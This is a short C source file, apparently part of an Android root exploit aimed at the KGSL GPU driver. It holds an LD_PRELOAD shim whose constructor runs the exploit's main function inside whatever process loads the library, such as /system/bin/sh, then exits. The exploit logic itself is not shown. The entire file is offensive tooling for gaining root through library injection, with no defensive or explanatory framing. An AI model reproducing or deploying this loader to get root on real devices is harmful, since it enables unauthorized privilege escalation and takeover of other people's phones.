#include <unistd.h>

/*
 * LD_PRELOAD entry: the exploit's main is built as kgsl_root_su_main and
 * called from a constructor, so loading this library into a host process
 * (e.g. /system/bin/sh) runs the exploit in that process.
 */
extern int kgsl_root_su_main(int argc, char **argv);

__attribute__((constructor))
static void kgsl_root_su_preload(void) {
    char *argv[] = { "kgsl_root_su", 0 };
    _exit(kgsl_root_su_main(1, argv));
}
